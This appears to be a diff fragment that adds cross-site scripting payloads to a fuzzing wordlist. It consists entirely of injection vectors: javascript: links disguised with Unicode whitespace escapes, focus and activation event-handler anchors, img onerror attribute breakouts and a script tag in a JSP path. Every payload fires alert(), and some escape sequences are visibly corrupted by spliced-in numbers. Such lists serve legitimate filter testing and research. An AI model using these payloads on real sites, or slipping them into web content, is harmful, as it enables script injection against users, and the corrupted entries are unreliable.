+<a href="\xE2\x80\xA9javascript:javascript:alert(481)" id="fuzzelement481">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:alert(1356)" id="fuzzelement1356">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:alert(457)" id="fuzzelement457">test</a>
+<a href="\xE2\x81383\x9Fjavascript:javascript:alert(1383)" id="fuzzelement1383">test</a>
+<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x8484\x9Fjavascript:javascript:alert(484)" id="fuzzelement484">test</a>
+<a href="\xE3\x80\x80javascript:javascript:alert(1369)" id="fuzzelement1369">test</a>
+<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE3\x80\x80javascript:javascript:alert(470)" id="fuzzelement470">test</a>
+<a href="\xE438\xA0\x8Ejavascript:javascript:alert(438)" id="fuzzelement438">test</a>
+<a href="\xE463\x9A\x80javascript:javascript:alert(463)" id="fuzzelement463">test</a>
+<a id="x"><rect fill="white" width="1000" height="1000"/></a>
+<a id=x tabindex=1 onactivate=alert(1)></a>
+<a id=x tabindex=1 onbeforeactivate=alert(1)></a>
+<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>
+<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<a id=x tabindex=1 onfocusin=alert(1)></a>
+"/></a></><img src=1740.gif onerror=alert(1740)>
+"/></a></><img src=1.gif onerror=alert(1)>
+a.jsp/<script>alert(232)</script>
